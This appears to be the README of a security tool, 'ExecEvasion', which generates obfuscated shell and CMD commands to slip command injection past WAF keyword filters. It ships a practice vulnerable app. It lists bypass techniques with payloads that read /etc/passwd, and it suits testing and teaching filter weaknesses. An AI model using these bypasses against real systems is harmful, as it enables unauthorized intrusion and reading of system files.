<div align="center">

# `ExecEvasion`

[![License](https://img.shields.io/badge/License-Apache%202.0-blue?style=flat-square)](LICENSE)
[![PRs Welcome](https://img.shields.io/badge/PRs-welcome-brightgreen?style=flat-square)](https://github.com/dr34mhacks/ExecEvasion/pulls)
[![GitHub stars](https://img.shields.io/github/stars/dr34mhacks/ExecEvasion.svg)](https://github.com/dr34mhacks/ExecEvasion/stargazers)

</div>

> When `cat /etc/passwd` gets blocked, but `c''at /e''tc/pa''sswd` doesn't.

A command obfuscation toolkit for pentesters, bug bounty hunters, CTF players, and anyone who's ever been frustrated by a WAF.

---

## What is this?

You found a command injection. Nice. You try to read `/etc/passwd`. Blocked. You try `whoami`. Blocked. The WAF is doing its job.

But here's the thing — shells are weird. They do strange things with quotes, backslashes, and variables. And most filters don't account for that.

**ExecEvasion** generates 50+ obfuscated versions of your command using 18 different techniques. One of them will probably work.

## Quick Start

No npm. No pip. No docker. Just open `index.html` in your browser. That's it.

## What It Does

Enter a command. Get variations like:

```bash
# Original
cat /etc/passwd

# What ExecEvasion generates
c'a't /etc/passwd           # Quote insertion
c\at /etc/passwd            # Backslash escape
c[a]t /etc/passwd           # Glob pattern
c$@at /etc/passwd           # Variable expansion
a=cat;b=/etc/passwd;$a $b   # Command split into variables then expanded
```

All of these execute `cat /etc/passwd`. Most filters only catch the first one.

## Techniques

### Linux/Unix
| Technique | Example | When to use |
|-----------|---------|-------------|
| Glob Patterns | `c[a]t` | Keyword blacklists |
| Quote Insertion | `c''a''t` | Simple string matching |
| Backslash Escape | `c\a\t` | Regex-based filters |
| Variable Expansion | `c$@at` | When `$` isn't blocked |
| Concatenation | `a=c;b=at;$a$b` | Multi-command allowed |
| Hex | `$'\x63\x61\x74'` | When nothing else works |
| Wildcards | `/e*/passwd` | Path blacklists |
| Brace Expansion | `{cat,/etc/passwd}` | Space filters |
| IFS | `cat${IFS}/etc/passwd` | Space blocked |

### Windows
| Technique | Example | When to use |
|-----------|---------|-------------|
| Caret Escape | `w^h^o^a^m^i` | CMD keyword filters |
| Quotes | `who""ami` | Simple matching |
| Env Substrings | `%COMSPEC:~0,1%` | Build from nothing |
| PowerShell Base64 | `powershell -e <b64>` | Heavy filtering |
| Char Codes | `[char[]](119,104,111)` | String blocked |

## The "Blocked Strings" Feature

Testing a target that blocks `cat`, `passwd`, and `etc`? Enter them in the blocked strings field. ExecEvasion marks which payloads avoid those strings.

No more guessing.

## Practice Challenge

I included a vulnerable web app so you can practice:

```bash
cd challenge
pip install flask
python app.py
# Open http://127.0.0.1:5000
```

It's a "secure" ping utility with WAF protection. Your job: read `/tmp/flag.txt`.

The filter blocks the obvious stuff. Use ExecEvasion to find what works.

## Who Is This For?

- **Bug Bounty Hunters** — That RCE you found is useless if you can't prove impact. Bypass the filter, read the file, write the report.

- **Pentesters** — Client has a WAF? Good. Now show them why signature-based blocking isn't enough.

- **CTF Players** — Stop manually trying quote variations. Generate them all. Find what works. Get the flag.

- **Security Researchers** — Study how different obfuscation techniques evade different filter types.

- **Red Teamers** — Test detection capabilities. See what their SOC catches and what slips through.

## Documentation

The `docs.html` page explains *why* each technique works:

- How shell parsing differs from filter parsing
- When specific techniques succeed or fail
- ASCII/hex reference tables
- Troubleshooting common issues

Understanding the "why" helps you adapt when pre-built payloads don't work.

## Project Structure

```
ExecEvasion/
├── index.html          # Main generator (just open this)
├── docs.html           # Technical documentation
├── challenge/          # Practice vulnerable app
│   ├── app.py
│   └── README.md
├── LICENSE
└── README.md
```

## Legal

This tool is for:
- Authorized penetration testing
- Bug bounty programs (with scope permission)
- CTF competitions
- Security research
- Educational purposes

Using this against systems you don't have permission to test is illegal. Don't be that person.

## Author

Built by [Sid Joshi](https://github.com/dr34mhacks)

If this helped you pop a shell or find a bug, consider starring the repo.

## License

Apache 2.0 — See [LICENSE](LICENSE) for details.

---

*"The best filter bypass is the one the filter author didn't think of."*
